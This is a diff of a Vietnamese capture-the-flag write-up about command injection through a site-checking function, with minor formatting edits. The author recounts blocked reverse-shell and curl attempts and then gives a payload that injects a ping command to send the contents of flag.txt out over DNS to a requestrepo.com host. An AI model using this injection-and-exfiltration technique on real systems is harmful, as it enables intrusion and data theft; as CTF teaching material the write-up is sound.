@@ -78,11 +78,10 @@ Mình thấy cái hàm `inetChecksite` này khá lạ và nó thuộc package `s
 
 
 Tới đây mình nghĩ sẽ tạo một reverse-shell, nhưng mọi cách đều failed vì trên phía server đã chặn hết các giao thức. Ban đầu mình sử dụng curl để gửi request đến server của mình thì ok, nhưng sau đó dùng curl để upload file `flag.txt` thì đã bị chặn or filter.
-Sau một hồi fuzzing thì mình tìm đến `DNS`, vì hầu như ứng dụng web nào cũng đều hỗ trợ giao thức DNS. 
+Sau một hồi fuzzing thì mình tìm đến `DNS`, vì hầu như ứng dụng web nào cũng đều hỗ trợ giao thức `DNS`. 
 
 
-Nhưng mà loay hoay một hồi mình sài lệnh nslookup, dig, host, blabla nó vẫn ko work. Cuối cùng sài lệnh ping thì lại oke . Cảm ơn Santa kkk
-
+Nhưng mà loay hoay một hồi mình sài lệnh nslookup, dig, host, blabla nó vẫn ko work. Cuối cùng sài lệnh `ping` thì lại oke .
 ## EXPLOIT
 
 ` PAYLOAD: http://45.119.84.224:4000/CaptureSite?url[]=$(ping%20`cat%20flag.txt`.ekiajtf3.requestrepo.com)`
